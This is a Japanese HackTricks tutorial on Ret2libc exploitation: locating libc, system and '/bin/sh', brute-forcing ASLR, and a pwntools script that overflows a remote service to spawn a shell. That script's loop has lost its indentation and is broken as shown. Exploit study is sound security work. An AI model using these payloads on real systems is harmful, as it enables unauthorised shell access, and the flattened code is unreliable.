# Ret2lib

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出してハッキングテクニックを共有してください。

</details>
{% endhint %}

## **基本情報**

**Ret2Libc**の本質は、脆弱なプログラムの実行フローを、スタック上の攻撃者提供のシェルコードを実行する代わりに、共有ライブラリ（たとえば**system**、**execve**、**strcpy**）内の関数にリダイレクトすることです。攻撃者は、ペイロードを作成し、スタック上の戻りアドレスを望ましいライブラリ関数を指すように変更し、同時に呼び出し規約に従って必要な引数を適切に設定するように配置します。

### **手順の例（簡略化）**

* 呼び出す関数（たとえばsystem）のアドレスと呼び出すコマンド（たとえば/bin/sh）を取得する
* 最初の引数をコマンド文字列を指すようにし、実行フローを関数に渡すためのROPチェーンを生成する

## アドレスの検索

* 現在のマシンで使用されている`libc`がどこにメモリにロードされるかは、次のコマンドで確認できます:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

ASLRがlibcのアドレスを変更しているかどうかを確認したい場合は、次のようにします:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 使用されているlibcを知っていると、`system`関数へのオフセットを見つけることも可能です:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 使用されているlibcを知っている場合、文字列 `/bin/sh` 関数へのオフセットを見つけることも可能です:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEFを使用する

使用しているlibcを知っている場合、PedaまたはGEFを使用して、**system**関数、**exit**関数、および文字列**`/bin/sh`**のアドレスを取得することも可能です：
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsを使用する

プロセスが**子プロセス**を作成している場合（ネットワークサーバーの場合）、そのファイルを**読み取ろう**としてみてください（おそらくroot権限が必要になるかもしれません）。

ここで、プロセス内で**libcがロードされている正確な場所**と、プロセスの**各子プロセスにロードされる場所**がわかります。

![](<../../../.gitbook/assets/image (853).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）

## 未知のlibc

バイナリがロードしている**libcがわからない**可能性があります（アクセス権がないサーバーにあるかもしれません）。その場合、脆弱性を悪用して**いくつかのアドレスを漏洩させ、どのlibcライブラリが使用されているか**を見つけることができます：

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

また、これに対するpwntoolsのテンプレートを以下で見つけることができます：

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2つのオフセットでlibcを知る

ページ[https://libc.blukat.me/](https://libc.blukat.me/)をチェックし、libc内の関数の**いくつかのアドレス**を使用して**使用されているバージョン**を特定します。

## 32ビットでASLRをバイパスする

これらのブルートフォース攻撃は**32ビットシステムにのみ有用**です。

* 攻撃がローカルの場合、libcのベースアドレスをブルートフォースすることができます（32ビットシステムに有用）:
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* リモートサーバーを攻撃する場合、`libc`関数`usleep`のアドレスを**10**（例）として試行することができます。サーバーが**10秒追加で応答する**ようになったら、この関数のアドレスを見つけました。

## ワンガジェット

`libc`内の**特定のアドレス**にジャンプしてシェルを実行します：

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2libコード例

この例では、ASLRブルートフォースがコードに統合されており、脆弱性のあるバイナリがリモートサーバーに配置されています：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib コード例

以下の例を確認してください：

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib 例

ARM64の場合、ret 命令は x30 レジスタが指す場所にジャンプし、スタックレジスタが指す場所にはジャンプしません。そのため、少し複雑です。

また、ARM64では命令がそのままの動作をします（命令の途中でジャンプして新しい命令に変換することはできません）。

以下の例を確認してください：

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (またはputs)

これにより、`printf`/`puts` を呼び出して特定のデータを引数として渡すことで、プロセスから情報を**漏洩**させることができます。たとえば、GOT 内の `puts` のアドレスを `puts` の実行に置くことで、メモリ内の `puts` のアドレスを**漏洩**させることができます。

## Ret2printf

これは、`ret2lib` を使用して `printf` フォーマット文字列の脆弱性に変換する**Ret2libの悪用**を意味します。`ret2lib` を使用して、それを悪用するための値を持って `printf` を呼び出します（無駄に聞こえるかもしれませんが、可能です）：

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## その他の例と参照

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib、libc 内の関数のアドレスを漏洩させることができる場合、one gadget を使用
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 ビット、ASLR 有効、PIE なし、最初のステップは、canary のバイト 0x00 までオーバーフローを埋め、その後 puts を呼び出して漏洩させる。canary を使用して、GOT 内の puts のアドレスを漏洩させ、`system('/bin/sh')` を呼び出すための ROP ガジェットを作成
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 ビット、ASLR 有効、canary なし、メイン関数内のスタックオーバーフロー。puts を呼び出して、GOT 内の puts のアドレスを漏洩させ、その後 one gadget を呼び出す
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 ビット、PIE なし、canary なし、relro なし、nx。write 関数を使用して、write（libc）のアドレスを漏洩させ、one gadget を呼び出す
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* スタックから canary を漏洩させるためにフォーマット文字列を使用し、システムにアドレス `/bin/sh` を持つ GOT に呼び出すためのバッファオーバーフローを使用
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 ビット、relro なし、canary なし、nx、pie。スタックから libc とヒープのアドレスを漏洩させるために悪いインデックスを悪用。バッファオーバーフローを悪用して、`system('/bin/sh')` を呼び出す ret2lib を行う（ヒープアドレスはチェックをバイパスするために必要）。

{% hint style="success" %}
AWS ハッキングの学習と実践：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ハッキングの学習と実践：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks のサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、Twitter 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する。

</details>
{% endhint %}
